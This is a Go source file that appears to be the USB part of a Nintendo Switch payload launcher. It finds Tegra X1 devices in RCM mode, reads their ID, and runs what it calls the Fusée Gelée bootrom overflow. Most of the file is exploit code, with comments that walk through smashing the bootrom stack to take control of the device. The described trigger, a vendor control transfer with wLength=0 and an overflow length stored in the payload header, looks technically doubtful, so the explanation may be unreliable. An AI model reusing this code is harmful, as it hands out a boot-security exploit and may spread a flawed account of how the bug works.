package usb

import (
	"fmt"

	"github.com/google/gousb"
)

const (
	// Tegra X1 RCM mode USB identifiers
	TegraVendorID  = 0x0955
	TegraProductID = 0x7321

	// RCM USB endpoints
	// Endpoint 0x81 = bulk IN  (device -> host) — used to read device ID
	// Endpoint 0x01 = bulk OUT (host -> device) — used to send payload chunks
	BulkInEndpointNum  = 1 // gousb uses endpoint number, not address
	BulkOutEndpointNum = 1

	// RCM interface
	RCMInterface = 0

	// DeviceIDSize — the bootrom sends 16 bytes automatically on RCM entry
	DeviceIDSize = 16

	// Payload is sent in 0x1000-byte chunks via bulk OUT.
	// The *length field* in the first chunk is set to 0x7000 rather than
	// the real payload size. The bootrom passes this length directly to
	// the DMA engine, which copies 0x7000 bytes into a 0x1000-byte bounce
	// buffer — overflowing onto the stack and overwriting the saved LR.
	ChunkSize      = 0x1000  // 4KB per bulk transfer
	OverflowLength = 0x7000  // oversized length — the actual exploit primitive
	MaxPayloadSize = 0x30000 // 192KB hard cap

	// Control transfer used to trigger the DMA copy after payload is uploaded.
	CtrlReqType = 0x41 // Host→Device | Vendor | Interface
	CtrlRequest = 0x00
)

// Context wraps the gousb context
type Context struct {
	ctx *gousb.Context
}

// Device represents a Tegra device in RCM mode with claimed interface + endpoints
type Device struct {
	dev   *gousb.Device
	intf  *gousb.Interface
	inEP  *gousb.InEndpoint
	outEP *gousb.OutEndpoint
}

// NewContext creates a new USB context
func NewContext() (*Context, error) {
	ctx := gousb.NewContext()
	return &Context{ctx: ctx}, nil
}

// Close releases the USB context
func (c *Context) Close() {
	c.ctx.Close()
}

// FindAllRCMDevices returns every Tegra X1 found in RCM mode on the system.
// This supports setups where multiple Switches are connected simultaneously.
func (c *Context) FindAllRCMDevices() ([]*Device, error) {
	var devices []*Device

	devs, err := c.ctx.OpenDevices(func(desc *gousb.DeviceDesc) bool {
		return desc.Vendor == gousb.ID(TegraVendorID) &&
			desc.Product == gousb.ID(TegraProductID)
	})
	if err != nil && len(devs) == 0 {
		return nil, fmt.Errorf(
			"no Tegra devices found in RCM mode (VID:0x%04X PID:0x%04X)",
			TegraVendorID, TegraProductID,
		)
	}

	for _, dev := range devs {
		dev.SetAutoDetach(true)

		intf, done, err := dev.DefaultInterface()
		if err != nil {
			dev.Close()
			continue
		}
		_ = done

		inEP, err := intf.InEndpoint(BulkInEndpointNum)
		if err != nil {
			intf.Close()
			dev.Close()
			continue
		}

		outEP, err := intf.OutEndpoint(BulkOutEndpointNum)
		if err != nil {
			intf.Close()
			dev.Close()
			continue
		}

		devices = append(devices, &Device{
			dev:   dev,
			intf:  intf,
			inEP:  inEP,
			outEP: outEP,
		})
	}

	if len(devices) == 0 {
		return nil, fmt.Errorf("found Tegra devices but could not claim any interfaces")
	}

	return devices, nil
}

// FindRCMDevice searches for a Tegra X1 in RCM mode, claims interface 0,
// and grabs the bulk IN/OUT endpoints. Call Close() when done.
func (c *Context) FindRCMDevice() (*Device, error) {
	dev, err := c.ctx.OpenDeviceWithVIDPID(
		gousb.ID(TegraVendorID),
		gousb.ID(TegraProductID),
	)
	if err != nil || dev == nil {
		return nil, fmt.Errorf(
			"no Tegra device found in RCM mode (VID:0x%04X PID:0x%04X) — "+
				"is the Switch in RCM? (VOL+ held while plugging in with jig)",
			TegraVendorID, TegraProductID,
		)
	}

	// Auto-detach any kernel driver that grabbed the interface (e.g. cdc_acm on Linux)
	dev.SetAutoDetach(true)

	// Claim interface 0, alternate setting 0.
	intf, done, err := dev.DefaultInterface()
	if err != nil {
		dev.Close()
		return nil, fmt.Errorf("failed to claim interface 0: %v", err)
	}
	_ = done

	// Bulk IN endpoint (device → host) — read device ID
	inEP, err := intf.InEndpoint(BulkInEndpointNum)
	if err != nil {
		intf.Close()
		dev.Close()
		return nil, fmt.Errorf("failed to get bulk IN endpoint: %v", err)
	}

	// Bulk OUT endpoint (host → device) — send payload chunks
	outEP, err := intf.OutEndpoint(BulkOutEndpointNum)
	if err != nil {
		intf.Close()
		dev.Close()
		return nil, fmt.Errorf("failed to get bulk OUT endpoint: %v", err)
	}

	return &Device{
		dev:   dev,
		intf:  intf,
		inEP:  inEP,
		outEP: outEP,
	}, nil
}

// Close releases the interface and device
func (d *Device) Close() {
	if d.intf != nil {
		d.intf.Close()
	}
	if d.dev != nil {
		d.dev.Close()
	}
}

// String returns a human-readable description
func (d *Device) String() string {
	if d.dev != nil && d.dev.Desc != nil {
		desc := d.dev.Desc
		return fmt.Sprintf(
			"Tegra X1 (Bus %03d Device %03d: ID %04x:%04x)",
			desc.Bus, desc.Address, desc.Vendor, desc.Product,
		)
	}
	return "Tegra X1 RCM Device"
}

// ReadDeviceID reads the 16-byte device ID from the Tegra via bulk IN.
// The bootrom sends this automatically when RCM starts — we just read it.
func (d *Device) ReadDeviceID() ([]byte, error) {
	buf := make([]byte, DeviceIDSize)

	n, err := d.inEP.Read(buf)
	if err != nil {
		return nil, fmt.Errorf("bulk IN read for device ID failed: %v", err)
	}
	if n != DeviceIDSize {
		return nil, fmt.Errorf("device ID: expected %d bytes, got %d", DeviceIDSize, n)
	}

	return buf, nil
}

// TriggerExploit sends the exploit payload and fires the Fusée Gelée vulnerability.
//
// The sequence:
//  1. Send payload in 0x1000-byte chunks via bulk OUT (ep 0x01).
//     Bytes 0–3 of the payload already contain 0x7000 (the overflow length),
//     written there by BuildPayload(). The bootrom reads this field and stores
//     it as the DMA transfer length without any bounds check.
//  2. Send a USB control transfer with wLength=0 to trigger the DMA copy.
//     The bootrom DMA-copies 0x7000 bytes into a 0x1000-byte bounce buffer,
//     smashing 0x6000 bytes of stack — including the saved return address (LR).
//  3. The bootrom's RCM handler returns → CPU jumps into our intermezzo.
func (d *Device) TriggerExploit(payload []byte) error {
	if len(payload) > MaxPayloadSize {
		return fmt.Errorf("payload too large: %d bytes (max: %d)", len(payload), MaxPayloadSize)
	}

	// Pad to chunk boundary
	if rem := len(payload) % ChunkSize; rem != 0 {
		payload = append(payload, make([]byte, ChunkSize-rem)...)
	}

	// --- Step 1: stream payload to device in 0x1000-byte chunks ---
	numChunks := len(payload) / ChunkSize
	fmt.Printf("  Sending %d bytes in %d chunks...\n", len(payload), numChunks)

	for offset := 0; offset < len(payload); offset += ChunkSize {
		chunk := payload[offset : offset+ChunkSize]

		n, err := d.outEP.Write(chunk)
		if err != nil {
			return fmt.Errorf("bulk OUT write failed at offset 0x%x: %v", offset, err)
		}
		if n != ChunkSize {
			return fmt.Errorf("short write at offset 0x%x: wrote %d of %d", offset, n, ChunkSize)
		}
	}

	// --- Step 2: trigger the DMA copy ---
	// wLength=0 signals end-of-payload. The bootrom now DMA-copies using
	// the length value from our payload header (0x7000), causing the overflow.
	_, err := d.dev.Control(
		CtrlReqType,
		CtrlRequest,
		0x0000, // wValue
		0x0000, // wIndex
		nil,    // no data phase — wLength=0 is the trigger
	)

	// USB error after this point is expected — the bootrom has been
	// taken over and stopped servicing USB. Check the device screen.
	if err != nil {
		fmt.Printf("  USB error after trigger (expected — bootrom redirected): %v\n", err)
	}

	return nil
}
